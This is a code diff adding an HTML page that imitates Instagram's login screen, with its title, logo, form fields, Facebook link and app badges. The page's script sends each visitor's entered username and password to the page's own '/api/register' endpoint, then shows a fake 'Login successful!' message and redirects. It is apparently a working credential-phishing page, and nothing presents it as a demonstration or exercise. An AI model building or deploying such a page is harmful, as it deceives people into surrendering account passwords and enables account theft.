@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            color: #262626;
+            line-height: 1.3;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 32px 16px;
+        }
+
+        .login-wrapper {
+            display: flex;
+            max-width: 935px;
+            width: 100%;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .phone-mockup {
+            display: none;
+            margin-right: 32px;
+        }
+
+        .phone-mockup img {
+            width: 454px;
+            height: 618px;
+        }
+
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .login-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 20px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .logo {
+            background-image: url("https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo-2010-2013.png");
+            width: 200px;
+            height: 70px;
+            margin: 0 auto 32px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        .form-group {
+            position: relative;
+            margin-bottom: 6px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 14px;
+            color: #262626;
+            outline: none;
+            transition: border-color 0.2s ease;
+        }
+
+        .form-input:focus {
+            border-color: #a8a8a8;
+            background: #fff;
+        }
+
+        .form-input::placeholder {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 7px 16px;
+            margin: 8px 0;
+            background: #4cb5f9;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+
+        .login-button:hover {
+            background: #1877f2;
+        }
+
+        .login-button:disabled {
+            background: #4cb5f9;
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .divider span {
+            padding: 0 18px;
+        }
+
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            margin-bottom: 18px;
+        }
+
+        .facebook-login:hover {
+            opacity: 0.8;
+        }
+
+        .facebook-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            background: url("data:image/svg+xml,%3Csvg width='16' height='16' viewBox='0 0 24 24' fill='%23385185' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'/%3E%3C/svg%3E") center/cover;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .forgot-password:hover {
+            opacity: 0.8;
+        }
+
+        .signup-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .signup-link {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-link:hover {
+            opacity: 0.8;
+        }
+
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .app-download p {
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .app-button {
+            height: 40px;
+        }
+
+        .error-message {
+            background: #ffeaa7;
+            color: #e17055;
+            padding: 10px;
+            border-radius: 3px;
+            font-size: 14px;
+            margin-bottom: 10px;
+            text-align: center;
+            display: none;
+        }
+
+        /* Responsive Design */
+        @media (min-width: 875px) {
+            .phone-mockup {
+                display: block;
+            }
+        }
+
+        @media (max-width: 450px) {
+            .container {
+                padding: 0;
+                background: #fff;
+            }
+
+            .login-box {
+                border: none;
+                padding: 40px 16px 20px;
+                background: #fff;
+            }
+
+            .signup-box {
+                border: none;
+                background: #fff;
+                padding: 20px 16px;
+            }
+        }
+
+        /* Form validation styles */
+        .form-input.error {
+            border-color: #ed4956;
+        }
+
+        .form-input.valid {
+            border-color: #8e8e8e;
+        }
+
+        /* Loading animation */
+        .loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-wrapper">
+            
+
+            <div class="login-container">
+                <div class="login-box">
+                    <div class="logo"></div>
+                    
+                    <form id="loginForm">
+                        <div class="error-message" id="errorMessage"></div>
+                        
+                        <div class="form-group">
+                            <input 
+                                type="text" 
+                                class="form-input" 
+                                id="username"
+                                placeholder="Phone number, username, or email"
+                                required
+                            >
+                        </div>
+                        
+                        <div class="form-group">
+                            <input 
+                                type="password" 
+                                class="form-input" 
+                                id="password"
+                                placeholder="Password"
+                                required
+                            >
+                        </div>
+                        
+                        <button type="submit" class="login-button" id="loginBtn">
+                            <span id="loginText">Log In</span>
+                            <div class="loading" id="loginLoader" style="display: none;"></div>
+                        </button>
+                    </form>
+
+                    <div class="divider">
+                        <span>OR</span>
+                    </div>
+
+                    <a href="#" class="facebook-login">
+                        <div class="facebook-icon"></div>
+                        Log in with Facebook
+                    </a>
+
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                </div>
+
+                <div class="signup-box">
+                    Don't have an account? <a href="#" class="signup-link">Sign up</a>
+                </div>
+
+                <div class="app-download">
+                    <p>Get the app.</p>
+                    <div class="app-buttons">
+                        <img src="data:image/svg+xml,%3Csvg width='136' height='40' viewBox='0 0 136 40' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='136' height='40' fill='%23000' rx='8'/%3E%3Ctext x='68' y='25' text-anchor='middle' fill='%23fff' font-size='12' font-family='system-ui'%3EApp Store%3C/text%3E%3C/svg%3E" alt="Download on the App Store" class="app-button">
+                        <img src="data:image/svg+xml,%3Csvg width='136' height='40' viewBox='0 0 136 40' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='136' height='40' fill='%23000' rx='8'/%3E%3Ctext x='68' y='25' text-anchor='middle' fill='%23fff' font-size='12' font-family='system-ui'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Get it on Google Play" class="app-button">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    const loginForm = document.getElementById('loginForm');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const loginBtn = document.getElementById('loginBtn');
+    const loginText = document.getElementById('loginText');
+    const loginLoader = document.getElementById('loginLoader');
+    const errorMessage = document.getElementById('errorMessage');
+
+    function validateForm() {
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+        loginBtn.disabled = !(username && password);
+    }
+
+    function showError(message) {
+        errorMessage.textContent = message;
+        errorMessage.style.display = 'block';
+        usernameInput.classList.add('error');
+        passwordInput.classList.add('error');
+    }
+
+    function hideError() {
+        errorMessage.style.display = 'none';
+        usernameInput.classList.remove('error');
+        passwordInput.classList.remove('error');
+    }
+
+    usernameInput.addEventListener('input', validateForm);
+    passwordInput.addEventListener('input', validateForm);
+
+    usernameInput.addEventListener('focus', hideError);
+    passwordInput.addEventListener('focus', hideError);
+
+    loginForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        // Show loading
+        loginBtn.disabled = true;
+        loginText.style.display = 'none';
+        loginLoader.style.display = 'inline-block';
+
+        try {
+            const res = await fetch("/api/register", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ user_id: username, password: password })
+            });
+
+            const data = await res.json();
+
+            // Reset loading
+            loginText.style.display = 'inline';
+            loginLoader.style.display = 'none';
+            loginBtn.disabled = false;
+
+            if (data.status === "success") {
+                alert("Login successful!");
+                // redirect user if needed
+                window.location.href = "/welcome.html";
+            } else {
+                showError(data.message || "Invalid username or password.");
+            }
+        } catch (err) {
+            loginText.style.display = 'inline';
+            loginLoader.style.display = 'none';
+            loginBtn.disabled = false;
+            showError("Server error. Please try again later.");
+        }
+    });
+
+    validateForm();
+</script>
+
+</body>
+</html>
